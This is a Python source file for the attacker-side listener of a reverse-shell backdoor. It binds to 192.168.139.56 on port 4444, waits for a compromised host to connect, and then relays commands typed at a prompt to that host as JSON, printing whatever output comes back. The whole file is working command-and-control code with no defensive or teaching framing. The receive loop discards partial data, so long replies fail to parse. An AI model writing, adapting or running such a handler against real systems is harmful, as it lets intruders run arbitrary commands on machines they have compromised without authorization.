import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] listener started..")
        self.connection,address = listener.accept()
        print("[*] Got connection from" +str(address))


    def box_send(self,data):
        json_data =json.dumps(data)
        self.connection.send(json_data.encode())    
    
    def box_recive(self):

        while True:
            json_data = ""
            try:
                json_data = json_data + str(self.connection.recv(1024).decode('cp866'))
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute(self,command):
        self.box_send(command)           
        return self.box_recive()
     
    def run(self):
        while True:
           command = input(">>")
           responsere = self.execute(command)
           print(responsere)

listener = Listener("192.168.139.56",4444)  
listener.run()
